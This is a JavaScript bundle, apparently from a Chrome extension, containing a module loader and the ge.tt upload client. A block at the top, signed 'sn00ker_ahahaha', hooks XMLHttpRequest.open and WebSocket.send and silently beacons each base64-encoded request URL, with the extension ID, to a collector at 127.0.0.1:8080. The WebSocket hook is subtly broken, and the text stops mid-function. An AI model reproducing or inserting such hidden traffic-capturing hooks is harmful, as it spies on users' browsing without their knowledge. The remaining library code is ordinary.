function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function() {
	if (typeof rex !== 'undefined') return;

	var __compile__ = function(module, exports, require) {
		if (typeof module.source === 'function') return module.source(module, exports, require);
		eval('(function(){ '+module.source+'\n})')();		
	};

	(function() {
		var modules = {};
		var setup = function(id, deps) {
			setup = function() {};

			for (var i = 0; i < deps.length; i++) {
				document.write('<script src="'+deps[i]+'"><\/script>\n');
			}
			if (deps.length) {
				document.write('<script>rex.run("'+id+'");<\/script>');
				return true;				
			}
		};
		var populated = function(obj) {
			if (typeof obj === 'function') return obj;
			for (var i in obj) return obj;
			return false;
		};
		var requirer = function(mod) {
			return function(id) {
				var result = resolve(id, mod);

				for (var i = 1; i < arguments.length; i++) {
					resolve(arguments[i], mod);
				}
				return result;
			};
		};
		var global = function(name) {
			return name && window[name.split('/').pop()];			
		};
		var resolve = function(name, mod) {
			var req = modules[mod.requires[name]];

			if (!req && global(name)) return global(name);
			if (!req) return null;
			if (req.exports) return req.exports;

			req.name = name;

			__compile__(req, req.exports = {}, requirer(req));
			return req.exports = (populated(req.exports) || global(name) || mod.exports);
		};

		rex = function(id, requires, source) {
			modules[id] = modules[id] || {requires: requires, source: source, browser: true};
		};
		rex.run = function(id, deps, global) {
			if (setup(id, deps || [])) return;
			__compile__(modules[id], {}, requirer(modules[id]));
		};
		require = function(name) {
			for (var i in modules) {
				if (modules[i].name === name) return modules[i].exports;
			}
			return global(name);
		};
	}());
}());
rex("b11e783ac79f48732db72a41be59458c",{"api":"3d1ba3d6cbe3a21cfd59b3b587135397","common":"0a433501923640ab6d616308c9685ac7","download":"bdcf3f0cad1197d7fb888471c1e972b6","upload":"e54bc31ebef8d770c17e73f6317b1313","models":"34c71697c8c78793e56b3a81ab4a51b4","mime":"fc0888fde853ad875a7d7be2e1e7acec","gc":"1a0727073f78dea597ee3f35fc6cc69b","user-options":"790b438e3e752138798076c30947fb88","context-menu":"51cff7e48f0fcc316c3ef7b5cb7c21a7"},function(module, exports, require) {
	require('api');
	require('common');
	require('download');
	require('upload');
	require('models');
	require('mime');
	require('gc');
	require('user-options');
	require('context-menu');
	
	//@ sourceURL=lib.js
});
rex("3d1ba3d6cbe3a21cfd59b3b587135397",{"crossmania":"d80a745415354d1987afc8761c29842e","common":"0a433501923640ab6d616308c9685ac7","./blobs":"4f829ca4ff248324547b750244fda1f7"},function(module, exports, require) {
	var mania = require('crossmania');
	var common = require('common');
	var blobs = require('./blobs');
	
	var noop = function() {};
	
	var blobify = function(blob) {
		// wrapped blob
		if (Object.prototype.toString.call(blob.blob) === '[object Blob]' && blob.filename) return {filename:blob.filename, source:blob.blob};
		// html5 file object
		if (Object.prototype.toString.call(blob) === '[object File]') return {filename:blob.name, source:blob};
		// jQuery input
		if (typeof blob.get === 'function' && blob.get(0)) return blobify(blob.get(0));
		// DOM input
		return {filename:blob.value.match(/(?:^|[\/\\])([^\/\\]+)$/)[1], source:blob};
	};
	var forEach = function(obj, fn) {
		if (obj.forEach) return obj.forEach(fn);
		if (obj.length) {
			for (var i = 0; i < obj.length; i++) {
				fn(obj[i], i);
			}
			return;
		}
		for (var i in obj) {
			if (obj.hasOwnProperty(i)) {
				fn(obj[i], i);	
			}
		}
	};
	var map = function(obj, fn) {
		var list = [];
	
		forEach(obj, function(item) {
			list.push(fn(item));
		});
	
		return list;
	};
	var find = function(obj, fn) {
		var found;
	
		forEach(obj, function(item, i) {
			if (!found && fn(item, i)) {
				found = item;
			}
		});
	
		return found;
	};
	var query = function(url, name, value) {
		return url+(url.indexOf('?') > -1 ? '&' : '?')+name+'='+encodeURIComponent(value);
	};
	var mixin = function(request, api) {
		var that = common.createEmitter();
		var pools = {};
	
		forEach(api.user || {}, function(value, name) {
			that[name] = value;
		});
	
		that.session = that.session || Math.random().toString(16).substr(2)+Math.random().toString(16).substr(2);
		that.accesstoken = that.accesstoken || api.accesstoken;
		that.refreshtoken = that.refreshtoken || api.refreshtoken;
		
		var accesstoken = function(callback) {
			var expires = parseInt(that.accesstoken.split('.')[3], 10) * 1000;
	
			if (!that.refreshtoken) return callback();
			if (expires && (expires - (new Date().getTime()) < 60*60*1000)) {
				request.post('/1/users/login').json({refreshtoken: that.refreshtoken}, common.fork(callback, function(response) {
					that.accesstoken = response.accesstoken;
					callback();
				}));
				return;
			}
			callback();
		};
		var toURL = function(options) {
			var url = options.url;
	
			forEach(options.query || options.qs || {}, function(val, key) {
				url = query(url, key, val);
			});
	
			return query(url, 'accesstoken', that.accesstoken);
		};
		that.post = function(options, body, callback) {
			if (typeof options === 'string') {
				options = {url:options};
			}
			if (typeof body === 'function') {
				callback = body;
				body = null;
			}
			accesstoken(function() {
				request.post(toURL(options)).json(options.body || body || {}, callback || noop);		
			});
		};
		that.get = function(options, callback) {
			if (typeof options === 'string') {
				options = {url: options};
			}
			accesstoken(function() {
				request.get(toURL(options)).json(callback || noop);
			});
		};
	
		var uploadNext = function(pool) {
			var uploading = find(pool, function(file) {
				return file.readystate === 'uploading';
			});
	
			if (uploading) return;
	
			var remote = find(pool, function(file) {
				return file.readystate === 'remote';
			});
	
			if (!remote) return;
	
			remote.readystate = 'uploading';
			remote.progress = 0;
	
			// only trigger onupload if it's a retry... otherwise we already called this in poolFile
			if (remote.retries) onupload();
	
			// let's ensure that we actually are supposed to upload this file...
			that.get('/1/files/'+remote.sharename+'/'+remote.fileid, function(err, fresh) {
				if (!fresh || !(fresh.readystate in {remote:1, uploading:1})) {
					remote.readystate = fresh ? fresh.readystate : 'failed';
					onuploadend(remote);
					uploadNext(pool);
					return;
				} 
	
				var upload = blobs.put(remote.upload.posturl, remote.source);
				var next = function() {
					var nextUpload = function() {
						uploadNext(pool);
					};
					var nextFile = find(pool, function(file) {
						return file.readystate === 'remote';
					});
	
					// to avoid rcs with same files we wait 2s between uploads...
					if (nextFile && (nextFile.filename === remote.filename)) return setTimeout(nextUpload, 2000);
					nextUpload();
				};
	
				that.emit('fileuploading', remote);
	
				upload.on('progress', function() {
					var delta = (upload.progress - remote.progress);
	
					remote.progress = upload.progress;
					that.emit('fileprogress', remote);
					onuploadprogress(delta, remote);
				});
				upload.on('upload', function() {
					remote.progress = 100;
					remote.readystate = 'uploaded';
					that.emit('fileupload', remote);
	
					onuploadend(remote);
					next();
				});
				upload.on('error', function() {
					remote.progress = 0;
					remote.retries = (remote.retries || 0) + 1;
					remote.readystate = remote.retries < 5 ? 'remote' : 'failed';
	
					if (remote.readystate === 'failed') {
						that.emit('fileerror', remote);
					}
	
					onuploadend(remote);
					next();
				});
			});
		};
	
		var totalUploading = 0;
		var totalUploaded = 0;
		var totalProgress = 0;
	
		var emitProgress = function(progress, file) {
			if (progress === that.progress) return;
			that.progress = progress;
			that.emit('progress', progress, file);
		};
		var onupload = function() {
			totalUploading++;
		};
		var onuploadprogress = function(delta, file) {
			totalProgress += delta;
			emitProgress(Math.floor(totalProgress / totalUploading), file);
		};
		var onuploadend = function(file) {
			totalUploaded++;
	
			if (totalUploaded === totalUploading) {
				totalUploading = totalUploaded = totalProgress = 0;
				emitProgress(100, file);
			}
		};
	
		var uploadFile = function(blob) {
			var sharename = blob.sharename;
			var pool = pools[sharename] = pools[sharename] || [];
	
			onupload();
			pool.push(blob);
			uploadNext(pool);
		};
	
		var createFiles = function(sharename, files, callback) {
			if (!files.length) return callback(null, []);
	
			common.step([
				function(next) {
					forEach(files, function(file) {
						createFile(sharename, file, next.parallel());
					});
				},
				function(files) {
					callback(null, files);
				}
			], callback);
		};
		var createFile = function(sharename, file, callback) {
			common.step([
				function(next) {
					that.post('/1/files/'+sharename+'/create', {filename:file.filename, session:that.session}, next);
				},
				function(result) {
					forEach(result, function(value, prop) {
						file[prop] = value;
					});
	
					file.progress = 0;
	
					uploadFile(file);
					callback(null, file);
				}
			], callback);
		};
	
		that.uploading = function(sharename, query) {
			if (!pools[sharename]) return false;
			if (typeof query === 'string') query = {filename:query};
	
			return find(pools[sharename], function(file) {
				for (var i in query) {
					if (file[i] !== query[i]) return false;
				}
	
				return file;
			});
		};
		that.upload = function(sharename, input, callback) {
			callback = callback || noop;
	
			return input.files ? createFiles(sharename, map(input.files, blobify), callback) : createFile(sharename, blobify(input), callback);
		};
		that.toJSON = function() {
			return api;
		};
	
		return that;
	};
	
	module.exports = function(options, callback) {
		var request = mania.create(options.host || 'https://open.ge.tt');
	
		if (options.accesstoken) return callback(null, mixin(request, options));
	
		request.post('/1/users/login').json({
			apikey: options.apikey,
			email: options.email,
			password: options.password,
			refreshtoken: options.refreshtoken
		}, common.fork(callback, function(api) {
			callback(null, mixin(request, api));
		}));
	
		return request;
	};
	//@ sourceURL=api/index.js
});
rex("d80a745415354d1987afc8761c29842e",{"curly":"3e9dbc1da1714e676b38693830d09ab8"},function(module, exports, require) {
	var curly = require('curly');
	
	var noop = function() {};
	var parseQuery = function(url) {
		var query = {};
		var queryString = url.split('?')[1];
	
		if (!queryString) {
			return null;
		}
	
		queryString = queryString.split('&');
	
		for (var i in queryString) {
			var parts = queryString[i].split('=');
		
			query[decodeURIComponent(parts[0])] = decodeURIComponent(parts[1]);
		}
	
		return query;
	};
	
	
	var JSONPish = function(url) {
		this._query = parseQuery(url);
		this._req = curly.jsonp(url).async().strict();
	};
	
	JSONPish.prototype.bust = function(val, callback) {
		this._req.bust(val);
	
		return this._short(callback);
	};
	JSONPish.prototype.timeout = function(timeout, callback) {
		this._req.timeout(timeout);
	
		return this._short(callback);	
	};
	JSONPish.prototype.query = function(query, callback) {
		this._query = query;
		
		return this._short(callback);
	};
	JSONPish.prototype.destroy = function() {
		this._req.destroy();
		
		return this;	
	};
	JSONPish.prototype.json = function(data, callback) {
		if (data && typeof data !== 'function') {
			data = JSON.stringify(data);
		}
		return this.send(data, callback);
	};
	JSONPish.prototype.send = function(data, callback) {
		if (data && typeof data !== 'function') {
			this._query = this._query || {};
			this._query.body = data;
		} else {
			callback = data || noop;
		}
		if (this._query) {		
			this._req.query(this._query);
		}
	
		this._req.send(function(err, res) {
			callback(err, res);
		});
		return this;
	};
	
	JSONPish.prototype._short = function(a,b) {
		return a ? this.send(a,b) : this;
	};
	
	var methods = ['get', 'put', 'post', 'del'];
	var jsonp = {};
	
	var onjsonpmethod = function(method) {
		jsonp[method] = function(pathname, callback) {
			var req = new JSONPish(pathname);
	
			if (callback) {
				req.send(callback);
			}
			return req;
		};
	};
	
	for (var i in methods) {
		onjsonpmethod(methods[i]);
	}
	
	exports.create = function(host) {
		if (host.charAt(host.length-1) === '/') {
			host = host.substring(0, host.length-1);
		}
		if (host.indexOf('://') === -1) {
			host = 'http://'+host;
		}
	
		var that = {};
		var cors = curly.cors({
			host:host,
			proxy:'/mania/proxy',
			ping:'/mania/ping'
		});
	
		that.type = cors ? cors.type : 'jsonp';
	
		var onmethod = cors ? 
			function(method) {
				if (method === 'get' || method === 'post') {
					that[method] = function(pathname, callback) {
						return cors[method](pathname, callback); // save some bytes! :D
					};
					return;			
				}
				if (method === 'del') {
					that.del = function(pathname, callback) {
						return cors.post('/mania/delete'+pathname, callback);
					};
					return;
				}
				if (method === 'put') {
					that.put = function(pathname, callback) {
						return cors.post('/mania/put'+pathname, callback);
					};
					return;	
				}
			} :
			function(method) {
				that[method] = function(pathname, callback) {
					return jsonp[method](host+'/mania/jsonp-'+method+pathname, callback);
				};
			};
	
		for (var i in methods) {
			onmethod(methods[i]);
		}	
		return that;
	};
	
	//@ sourceURL=api/browser_modules/crossmania.js
});
rex("3e9dbc1da1714e676b38693830d09ab8",{},function(module, exports, require) {
	if (typeof XMLHttpRequest == 'undefined') {
		XMLHttpRequest = function () {
			try {
				return new ActiveXObject('Msxml2.XMLHTTP.6.0');
			} catch (e) {}
			try {
				return new ActiveXObject('Msxml2.XMLHTTP.3.0');
			} catch (e) {}
			try {
				return new ActiveXObject('Microsoft.XMLHTTP');
			} catch (e) {}
			
			// Microsoft.XMLHTTP points to Msxml2.XMLHTTP and is redundant
			throw new Error('This browser does not support XMLHttpRequest.');
		};
	}
	var noop = function() {};
	
	var prefix = (new Date()).getTime().toString(36);
	var cache = {};
	var globalScope = window._tmp_jsonp = {}; // A global variable to reference jsonp closures
	var cnt = 0;
	var active = {};
	
	window.onunload = function() {
		for (var i in active) {
			active[i].abort();
		}
	};
	
	var createDeferred = function() {
		var that = {};
		var stack = [];
	
		var action = function(method, path, data, callback) {
			callback = callback || noop;
	
			var send = function() {
				destroy = action(method, path, data, callback);
			};
			var destroy = function() {			
				for (var i = 0; i < stack.length; i++) {
					if (stack[i] === send) {
						stack.splice(i, 1);
						break;
					}
				}
	
				callback(new Error('request cancelled'));
			};
	
			stack.push(send);
	
			return function() {
				destroy();
			};
		};
	
		that.fulfilled = false;
	
		that.ready = function(fn) {
			that.fulfilled = true;
			action = fn;
	
			while (stack.length) {
				stack.shift()();
			}
		};
		that.send = function(a,b,c,d) {
			return action(a,b,c,d);
		};
	
		return that;
	};
	
	var hostify = function(address) {
		return address.match(/(http|https):\/\/([^\/]+)/).slice(1).join('://');
	};
	var addEvent = function(name, fn) {
		if (window.attachEvent) {
			window.attachEvent('on'+name, fn);
		} else {
			window.addEventListener(name, fn, false);
		}
	};
	var onbody = function(fn) {
		if (document.body) {
			fn();
		} else {
			addEvent('load', fn);
		}
	};
	var querify = function(query) {
		var result = '';
	
		for (var i in query) {
			if (result) {
				result += '&';
			}
			result += i+'='+encodeURIComponent(query[i]);
		}
		return result;
	};
	var send = function(method, path, data, ondone) {
		var xhr = new XMLHttpRequest();
		var id = ''+(++cnt);
		var called = false;
	
		var callback = function(err, value) {
			if (called) {
				return;
			}
	
			called = true;
			ondone(err, value);
		};
	
		active[id] = xhr;
		
		var tidy = function() {
			delete active[id];
			xhr.onreadystatechange = noop;		
		};
		var onresponse = function() {
			if (!/2\d\d/.test(xhr.status)) {
				var err = new Error('invalid status='+xhr.status);
	
				err.statusCode = xhr.status;
				callback(err);
				return
			}
	
			callback(null, xhr.responseText);
		};
	
		xhr.open(method, path, true);
		xhr.onreadystatechange = function() {
			if (xhr.readyState !== 4) {
				return;
			}
	
			tidy();
			setTimeout(onresponse, 1); // push it to the event stack
		};
	
		xhr.send(data);
		
		return function() {
			if (called) {
				return;
			}
	
			tidy();
			xhr.abort();
			callback(new Error('request aborted'));
		};
	};
	var proxy = function(url) {
		if (url.indexOf('://') === -1) {
			url = window.location.protocol+'//'+window.location.host+url;
		}
		if (cache[url]) {
			return cache[url];
		}
	
		var host = url.match(/^[^:]+:\/\/[^\/]+/i)[0];
		var deferred = createDeferred();
		var callbacks = {};
	
		var post = function() {
			var ifr = document.createElement('iframe');
	
			ifr.src = url;
			ifr.style.display = 'none';
	
			onbody(function() {
				document.body.appendChild(ifr);		
			});
			
			return function(message) {
				ifr.contentWindow.postMessage(JSON.stringify(message), '*');
				message = null; // no ie leaks					
			};
		}();
		var ready = function(method, path, data, callback) {
			var params = [method, path, data];
			var id = 's'+(cnt++);
	
			callback = callback || noop;
			callbacks[id] = function(err, result) {
				delete callbacks[id];
	
				callback(err, result);
			};
	
			post({name:'request', id:id, params:params});
	
			return function() {
				if (!callbacks[id]) {
					return;
				}
	
				post({name:'destroy', id:id});
				// this guard is need as the top call can sync cause mutations in callbacks (which is ok)
				(callbacks[id] || noop)(new Error('request cancelled'));
			};
		};
	
		addEvent('message', function(e) {
			if (e.origin !== host) {
				return;
			}
			if (!deferred.fulfilled) {
				deferred.ready(ready);
				return;
			}
	
			var message = JSON.parse(e.data);
	
			(callbacks[message.id] || noop)(message.error && new Error(message.error), message.result);				
			message = null; // no ie leaks
		});
	
		return cache[url] = function(method, path, data, callback) {
			return deferred.send(method, path, data, callback);
		};
	};
	
	var Request = function(method, url, send) {
		url = url.split('?');
	
		this._bust = true;
		this._send = send;
		this._method = method;
		this._url = url[0];
		this._query = (url[1] || '') && '?'+url[1];
	};
	
	Request.prototype.timeout = function(ms, callback) {
		var self = this;
	
		if (ms) {
			this._timeout = setTimeout(function() {
				self.destroy();
			}, ms);		
		}
	
		return this._short(callback);
	};
	Request.prototype.destroy = noop;
	Request.prototype.query = function(query, callback) {
		this._query = querify(query);
		this._query = (this._query && '?') + this._query;
		return this._short(callback);
	};
	Request.prototype.form = function(data, callback) {
		this._encode = querify;
		return this._short(data, callback);
	};
	Request.prototype.json = function(json, callback) {
		this._encode = function(data) {
			return JSON.stringify(data);
		};
		this._decode = function(data) {
			return JSON.parse(data);	
		};
		return this._short(json, callback);
	};
	Request.prototype.bust = function(val, callback) {
		if (typeof val === 'function') {
			callback = val;
			val = true;
		}
		this._bust = val !== false;
		return this._short(callback);	
	};
	Request.prototype.send = function(data, callback) {
		if (!callback && typeof data !== 'function') {
			callback = noop;
		}
		if (!callback) {
			callback = data;
			data = null;
		} else {
			data = this._encode(data);
		}
		this._addBust();
	
		var self = this;
	
		this.destroy = this._send(this._method, this._url+this._query, data, function(err, value) {
			self.destroy = noop;
			
			if (self._timeout) {
				clearTimeout(self._timeout);
			}
			if (err) {
				callback(err);
				return;
			}
			try {
				value = self._decode(value);
			} catch(err) {
				callback(err);
				return;
			}
			callback(null, value);
		});
	
		return this;
	};
	Request.prototype._short = function(a,b) {
		return a ? this.send(a,b) : this;
	};
	Request.prototype._encode = function(data) {
		return ''+data;
	};
	Request.prototype._decode = function(data) {
		return data;
	};
	Request.prototype._addBust = function() {
		if (!this._bust) {
			return;
		}
		this._query += (this._query ? '&' : '?') + 't='+(new Date()).getTime();
	};
	
	var JSONP = function(url) {
		url = url.split('?');
	
		this._bust = true;
		this._url = url[0];
		this._query = url.slice(1).join('?') || '';
		this._query = this.query && '?'+this._query;
	};
	
	JSONP.prototype.timeout = Request.prototype.timeout; // exactly the same
	JSONP.prototype.query = Request.prototype.query; // exactly the same
	JSONP.prototype.bust = Request.prototype.bust; // exactly the same
	
	JSONP.prototype.strict = function(callback) {
		this._strict = true;
		return this._short(callback);	
	};
	JSONP.prototype.async = function(callback) {
		this._async = true;
		return this._short(callback);
	};
	JSONP.prototype.send = function(method, callback) {
		if (!callback && typeof method !== 'string') {
			callback = method;
			method = 'callback';
		}
		callback = callback || noop;
	
		this._addBust();
	
		var self = this;
		var match = this._query.match(/(^|&)([^=])+=\?/);
		var id = 'cb'+prefix+(cnt++).toString(36);
		var callbackId = '_tmp_jsonp.'+id;
		var ended = false;
	
		if (match) {
			this._query = this._query.replace(match[2]+'=?', match[2]+'='+callbackId);
		} else {
			this._query += (this._query ? '&' : '?') + method+'='+callbackId;
		}
	
		var url = this._url+this._query;
	
		var onresult = function(err, result) {
			ended = true;
	
			var el = document.getElementById(id);
			
			if (el) {
				el.onreadystatechange = el.onclick = noop;
				el.parentNode.removeChild(el);
			}
			el = null; // no mem leaks
	
			delete globalScope[id];
			self.destroy = noop;
	
			callback(err, result);
		};
	
		globalScope[id] = function(result) {
			if (self._strict && (result === undefined || result === null || result.error)) {
				var err = new Error((result && result.error) || 'result is undefined or null');
				
				if (result) {
					for (var i in result) {
						err[i] = result[i];
					}
				}
				onresult(err);
				return;
			}
			onresult(null, result);		
		};
	
		var attachErrorHandling = function() {
			if (!document.getElementById(id)) {
				return; // safety
			}
			document.getElementById(id).onreadystatechange = function() {
				if (ended || (this.readyState !== 'loaded' && this.readyState !== 'complete')) {
					return;
				}
				onresult(new Error('jsonp request failed'));								
			};		
		};
	
		if (document.body || this._async) {
			onbody(function() {
				var el = document.createElement('script');
	
				el.async = true;
				el.src = url;
				el.id = id;
	
				document.getElementsByTagName('head')[0].appendChild(el);
				
				el = null; // no leaks
				attachErrorHandling();
			});
		} else {
			document.write(unescape('%3Cscript')+' src="'+url+'" id="'+id+'"'+unescape('%3E%3C/script%3E'));
			attachErrorHandling();
		}
		
		this.destroy = function() {
			this.destroy = noop;
	
			onresult(new Error('jsonp request was cancelled'));
			globalScope[id] = noop;
	
			setTimeout(function() { 
				delete globalScope[id]; // we lazy collect the noop after 2 mins to allow the server to respond without an error
			}, 2*60*1000);
		};
	
		return this;
	};
	JSONP.prototype.destroy = noop;
	
	JSONP.prototype._short = Request.prototype._short; // exactly the same
	JSONP.prototype._addBust = Request.prototype._addBust; // exactly the same
	
	
	var methods = {'POST':0, 'GET':0, 'DELETE':'del', 'PUT':0};
	
	var define = function(method, sender) {
		return function(url, callback) {
			var req = new Request(method, url, sender || send);
	
			if (callback) {
				req.send(callback);
			}
	
			return req;
		};
	};
	var defineTo = function(that, type, send) {
		for (var method in methods) {
			that[(methods[method] || method).toLowerCase()] = define(method, send);
		}
		that['delete'] = that.del;
	
		that.type = type;
		that.cors = exports.cors;
		that.jsonp = exports.jsonp;
	
		return that;
	};
	
	var baddie = window.navigator.userAgent.match(/msie (\d+)/i);
	
	baddie = baddie && baddie[1] && parseInt(baddie[1]);
	
	var corsable = ('withCredentials' in new XMLHttpRequest());
	var proxyable = !!window.postMessage && (!baddie || baddie > 7);
	
	exports.jsonp = function(url, callback) {
		var req = new JSONP(url);
	
		if (callback) {
			req.send(callback);
		}
		return req;
	};
	exports.cors = function(options) {
		var ping;
		var proxyHost;
	
		if (typeof options === 'string') {
			proxyHost = options;
		} else {
			proxyHost = options.host+options.proxy;
			ping = options.ping && (options.host+ (typeof options.ping === 'string' ? options.ping : options.proxy));
		}
	
		if (corsable) {
			var deferred = createDeferred();
			var host = hostify(proxyHost);
	
			var oncors = function(method, path, data, callback) {
				return send(method, host+path, data, callback);
			};
	
			if (ping) {
				send('GET', ping, null, function(err, data) {
					deferred.ready(err ? proxy(proxyHost) : oncors);
				});
			} else {
				deferred.ready(oncors);
			}
	
			return defineTo({}, 'cors', deferred.send);
		}
		if (proxyable) {
			return defineTo({}, 'proxy', proxy(proxyHost));
		}
		return null;
	};
	
	defineTo(exports, 'ajax', send);
	//@ sourceURL=api/browser_modules/curly.js
});
rex("0a433501923640ab6d616308c9685ac7",{},function(module, exports, require) {
	var noop = function() {};
	
	var Emitter;
	
	if (!module.browser) {
		Emitter = require('events').EventEmitter; // node-only
	} else {
		Emitter = function() {
			this._events = {};
		};
	
		Emitter.prototype.on = Emitter.prototype.addListener = function(name, listener) {
			this.emit('newListener', name, listener);
			(this._events[name] = this._events[name] || []).push(listener);
		};
		Emitter.prototype.once = function(name, listener) {
			var self = this;
	
			var onevent = function() {
				self.removeListener(name, listener);
				listener.apply(this, arguments);
			};
	
			onevent.listener = listener;	
			this.on(name, onevent);
		};
		Emitter.prototype.emit = function(name) {
			var listeners = this._events[name];
	
			if (!listeners) {
				return;
			}
			var args = Array.prototype.slice.call(arguments, 1);
	
			listeners = listeners.slice();
	
			for (var i = 0; i < listeners.length; i++) {
				listeners[i].apply(null, args);
			}
		};
		Emitter.prototype.removeListener = function(name, listener) {
			var listeners = this._events[name];
	
			if (!listeners) {
				return;
			}
			for (var i = 0; i < listeners.length; i++) {
				if (listeners[i] === listener || (listeners[i].listener === listener)) {
					listeners.splice(i, 1);
					break;
				}
			}
			if (!listeners.length) {
				delete this._events[name];
			}
		};
		Emitter.prototype.removeAllListeners = function(name) {
			if (!arguments.length) {
				this._events = {};
				return;
			}
			delete this._events[name];
		};
		Emitter.prototype.listeners = function(name) {
			return this._events[name] || [];
		};	
	}
	
	Object.create = Object.create || function(proto) {
		var C = function() {};
		
		C.prototype = proto;
		
		return new C();
	};
	
	exports.extend = function(proto, fn) {
		var C = function() {
			proto.call(this);
			fn.apply(this, arguments);
		};
		C.prototype = Object.create(proto.prototype);
	
		return C;		
	};
	
	exports.createEmitter = function() {
		return new Emitter();
	};
	
	exports.emitter = function(fn) {
		return exports.extend(Emitter, fn);
	};
	
	// functional patterns below
	
	exports.fork = function(a,b) {
		return function(err, value) {
			if (err) {
				a(err);
				return;
			}
			b(value);
		};
	};
	
	exports.step = function(funcs, onerror) {
		var counter = 0;
		var completed = 0;
		var pointer = 0;
		var ended = false;
		var state = {};
		var values = null;
		var complete = false;
	
		var check = function() {
			return complete && completed >= counter;
		};
		var next = function(err, value) {
			if (err && !ended) {
				ended = true;
				(onerror || noop).apply(state, [err]);
				return;
			}
			if (ended || (counter && !check())) {
				return;
			}
	
			var fn = funcs[pointer++];
			var args = (fn.length === 1 ? [next] : [value, next]);
	
			counter = completed = 0;
			values = [];
			complete = false;
			fn.apply(state, pointer < funcs.length ? args : [value, next]);
			complete = true;
	
			if (counter && check()) {
				next(null, values);
			}
		};
		next.parallel = function() {
			var index = counter++;
	
			if (complete) {
				throw new Error('next.parallel must not be called async');
			}
			return function(err, value) {
				completed++;
				values[index] = value;
				next(err, values);
			};
		};
	
		next();
	};
	
	exports.memoizer = function(fn) {
		var cache = {};
		
		var stringify = function(obj) {
			var type = typeof obj;
	
			if (type !== 'object') {
				return type + ': ' + obj;
			}
			var keys = [];
			
			for (var i in obj) {
				keys.push(stringify(obj[i]));
			}
			return keys.sort().join('\n');
		};
		
		return function() {
			var key = '';
			
			for (var i = 0; i < arguments.length; i++) {
				key += stringify(arguments[i]) + '\n';
			}
			
			cache[key] = cache[key] || fn.apply(null, arguments);
	
			return cache[key];
		};
	};
	
	exports.curry = function(fn) {
		var args = Array.prototype.slice.call(arguments, 1);
	
		return function() {
			return fn.apply(this, args.concat(Array.prototype.slice.call(arguments)));
		};
	};
	
	exports.once = function(fn) {
		var once = true;
	
		return function() {
			if (once) {
				once = false;
				(fn || noop).apply(null, arguments);
				return true;
			}
			return false;
		};
	};
	
	exports.future = function() {
		var that = {};
		var stack = [];
		
		that.get = function(fn) {
			stack.push(fn);
		};
		that.put = function(a,b) {
			that.get = function(fn) {
				fn(a,b);
			};
			
			while (stack.length) {
				stack.shift()(a,b);
			}
		};
		return that;
	};
	
	// utilities below
	
	exports.encode = function(num) {
		var ALPHA = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
	
		return function(i) {
			return i < ALPHA.length ? ALPHA.charAt(i) : exports.encode(Math.floor(i / ALPHA.length)) + ALPHA.charAt(i % ALPHA.length);
		};
	}();
	
	exports.uuid = function() {
		var inc = 0;		
	
		return function() {
			var uuid = '';
	
			for (var i = 0; i < 36; i++) {
				uuid += exports.encode(Math.floor(Math.random() * 62));
			}
			return uuid + '-' + exports.encode(inc++);			
		};
	}();
	
	exports.gensym = function() {
		var s = 0;
		
		return function() {
			return 's'+(s++);
		};
	}();
	
	exports.join = function() {
		var result = {};
		
		for (var i = 0; i < arguments.length; i++) {
			var a = arguments[i];
			
			for (var j in a) {
				result[j] = a[j];
			}
		}
		return result;
	};
	
	exports.format = function (str, col) {
		col = typeof col === 'object' ? col : Array.prototype.slice.call(arguments, 1);
	
		return str.replace(/\{([^{}]+)\}/gm, function () {
			return col[arguments[1]] === undefined ? arguments[0] : col[arguments[1]];
		});
	};
	
	exports.log = function(str) {
		if (typeof window !== 'undefined' && !window.console) {
			return;
		}
		console.log(str);
	};
	
	//@ sourceURL=common/index.js
});
rex("4f829ca4ff248324547b750244fda1f7",{"common":"0a433501923640ab6d616308c9685ac7"},function(module, exports, require) {
	var common = require('common');
	
	var PREFIX = 'blob-'+common.encode(new Date().getTime())+'-';
	
	var noop = function() {};
	var onevent = window.addEventListener ? 
		function(elem, name, fn) {
			elem.addEventListener(name, fn, false);
	
			return function() {
				elem.removeEventListener(name, fn, false);
			};	
		} :
		function(elem, name, fn) {
			elem.attachEvent('on'+name, fn);
	
			return function() {
				elem.detachEvent('on'+name, fn);
			};
		};
	
	var isBlob = function(obj) {
		var type = Object.prototype.toString.call(obj);
	
		return type === '[object File]' || type === '[object Blob]';
	};
	var now = function() {
		return new Date().getTime();	
	};
	var addQuery = function(url, name, val) {
		return url + (url.indexOf('?') > -1 ? '&' : '?') + name+'='+encodeURIComponent(val);
	};
	
	var main = function() {
		var div = document.createElement('div');
		
		div.style.position = 'absolute';
		div.style.left = '-1000px';
		div.style.top = '-1000px';
		div.style.width = '100px';
		div.style.height = '100px';
		div.style.overflowX = 'hidden';
		div.style.overflowY = 'hidden';
	
		document.body.appendChild(div);
	
		main = function() {
			return div;
		};
	
		return div;
	};
	var onchannelmessage = function(channel, onmessage) { // TODO: add this to the curly proxy also
		channel += '::';
	
		return function(e) {
			if (e.data.substring(0, channel.length) !== channel) {
				return;
			}
			onmessage(e.data.substring(channel.length));
		};
	};
	
	var createProgressFrame = function(url) {
		var that = common.createEmitter();
		var div = document.createElement('div');
		var progressId = that.id = PREFIX+common.uuid();
		var progressURL = url.match(/(\w+:\/\/[^\/]+)?/)[1]+'/progress/'+progressId;
	
		div.innerHTML = '<iframe name="'+progressId+'" id="'+progressId+'" width="2000" src="'+progressURL+'"></iframe>';
	
		main().appendChild(div);
		that.uploadURL = addQuery(url, 'progressId', progressId);
	
		var progressFrame = document.getElementById(progressId);
		var ended = false;
	
		var onend = function(message) {
			if (ended) {
				return;
			}
			ended = true;
	
			unbind();
			main().removeChild(div);
			that.emit(message);
		};
		var onprogressmessage = function(fn) {
			var cancel = onevent(window, 'message', onchannelmessage(progressId, function(message) {
				fn(parseInt(message, 10));			
			}));
	
			progressFrame.onresize = function() {
				fn(Math.round(progressFrame.offsetWidth/10));
			};
	
			return function() {
				progressFrame.onresize = noop;
				cancel();
			};
